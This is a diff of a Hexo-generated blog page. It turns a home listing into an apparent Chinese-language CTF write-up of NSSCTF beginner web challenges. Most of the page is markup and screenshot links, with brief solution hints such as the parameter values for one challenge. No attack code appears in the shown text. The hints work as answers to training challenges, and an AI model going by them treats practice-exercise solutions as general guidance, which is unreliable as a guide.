@@ -1,10 +1,226 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta property="og:type" content="website">
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="title: NSSCTF WEBdate: 2023-1-6 10:25:33tags:  NSSCTF web安全入门categories: NSSCTF web安全入门                      一、[SWPUCTF 2021 新生赛]jicao       打开后出现这样一堆代码  经阅读可知，要想获取flag，需要POST一个值为wllmNB的参数id和GET一个值为{“">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:url" content="http://example.com/2023/01/09/NSSCTF%20WEB/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="title: NSSCTF WEBdate: 2023-1-6 10:25:33tags:  NSSCTF web安全入门categories: NSSCTF web安全入门                      一、[SWPUCTF 2021 新生赛]jicao       打开后出现这样一堆代码  经阅读可知，要想获取flag，需要POST一个值为wllmNB的参数id和GET一个值为{“">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071607884.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071630815.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071630308.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071657640.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081023505.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071718113.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081027391.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081028420.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081029323.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081030153.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081048166.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081050326.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131504554.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131505442.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131548149.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131549751.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131550875.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131552182.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131556083.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301111241802.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131606087.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131606124.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131610867.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131611223.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141346762.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141346152.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141348351.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141353992.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141354123.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141421711.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141424733.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141425949.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141426075.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141433590.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141524463.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141525596.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141525920.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141526545.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141527156.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141531800.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141531378.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161247333.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161256656.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161259909.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161303862.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161305488.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161501367.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161344813.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061554316.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161333824.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161338946.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151651849.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151652289.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151654815.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151657048.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151657098.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151659646.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161536904.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161537841.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161538298.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161538981.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061640144.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061645013.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061645758.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061648745.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111432130.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111433470.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111433079.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111434453.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111442737.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111443632.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111448541.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111448288.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111509396.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111506640.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111508663.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111625835.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111544052.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111548387.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111550040.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111623764.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111634746.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111635909.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401211315075.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401211317033.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111640690.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121427123.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121427237.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121428674.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121431101.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121451932.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121453975.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121454102.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121454294.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121720198.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121722265.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121723492.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121741716.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121742764.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121743163.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121744102.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121744842.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151428577.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151432753.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151432296.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151445090.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151519504.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151520062.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151521725.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151521798.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151524854.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151524475.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151544848.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151627219.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151635643.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151639166.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221211835.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221222878.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221223417.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221208966.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221223698.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221557477.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221557311.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221558932.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221600535.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221555294.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221602742.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221609276.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221614172.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221615921.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221630996.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221630694.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221633382.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221635386.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221643437.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221653532.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231738376.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231741793.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231905361.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231905885.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231904983.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231908926.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231909621.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231909520.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261615869.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261603852.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261602947.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261604941.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261606570.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261613312.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261632343.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261631056.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261633350.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261636508.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261644751.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261725871.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261725300.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261726517.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291616500.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291314442.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401301138296.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401301138703.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291306199.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291614614.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401311451545.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011443662.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011443690.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011444568.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011444960.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011446766.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011442912.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021330390.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021332931.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021333592.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021353025.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021327077.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021328284.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021330448.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021447505.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021457716.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021458001.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041134435.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041136204.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041139232.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041140043.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041137531.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041135746.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041137910.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041152938.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041149550.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041150706.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041151201.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051103390.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051109018.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051109275.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051103322.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051124520.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051124874.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051125497.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071151506.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071152545.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071154095.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071151586.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071157102.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071217818.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071216785.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071223259.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081051175.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081052730.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081054637.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081055568.png">
+<meta property="article:published_time" content="2023-01-09T14:01:08.476Z">
+<meta property="article:modified_time" content="2024-03-06T09:30:56.658Z">
 <meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary"><title>Hexo</title><link ref="canonical" href="http://example.com/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071607884.png"><title>[ Untitled ] | Hexo</title><link ref="canonical" href="http://example.com/2023/01/09/NSSCTF%20WEB/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
 var CONFIG = {
   root: '/',
   algolia: undefined,
@@ -28,7 +244,7 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/01/09/NSSCTF%20WEB/">[ Untitled ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-01-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-03-06</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>title: NSSCTF WEB<br>date: 2023-1-6 10:25:33<br>tags:</p>
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">[ Untitled ]</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-01-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-03-06</span></span></div></header><div class="post-body"><p>title: NSSCTF WEB<br>date: 2023-1-6 10:25:33<br>tags:</p>
 <ul>
 <li>NSSCTF web安全入门<br>categories:</li>
 <li>NSSCTF web安全入门</li>
@@ -930,676 +1146,83 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br></pre></td></tr></table></div></figure>
 
 <p>同[UUCTF 2022 新生赛]websign</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">PHP环境搭建</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-14</span></span></div></header><div class="post-body"><div class="post-excerpt">
-        <h1 id="一、调试搭建"   >
-          <a href="#一、调试搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、调试搭建" class="headerlink" title="一、调试搭建"></a>一、调试搭建</h1>
-      
-        <h2 id="🔺Windows版本"   >
-          <a href="#🔺Windows版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺Windows版本" class="headerlink" title="🔺Windows版本"></a>🔺Windows版本</h2>
-      
-        <h2 id="1-前置安装"   >
-          <a href="#1-前置安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置安装" class="headerlink" title="1.前置安装"></a>1.前置安装</h2>
-      <p>phpstorm+phpStudy</p>
-<p>这两个需要先装好，之后利用phpStudy中自带的xdebug来调试</p>
-
-        <h2 id="2-phpStudy设置"   >
-          <a href="#2-phpStudy设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpStudy设置" class="headerlink" title="2.phpStudy设置"></a>2.phpStudy设置</h2>
-      
-        <h3 id="1-php版本"   >
-          <a href="#1-php版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-php版本" class="headerlink" title="(1)php版本"></a>(1)php版本</h3>
-      <p>这里我的php选择的是如下</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071053181.png" alt="image-20220107105326110"></p>
-
-        <h3 id="2-打开xdebug"   >
-          <a href="#2-打开xdebug" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-打开xdebug" class="headerlink" title="(2)打开xdebug"></a>(2)打开xdebug</h3>
-      <p>单击设置-&gt;扩展组件，设置如下</p>
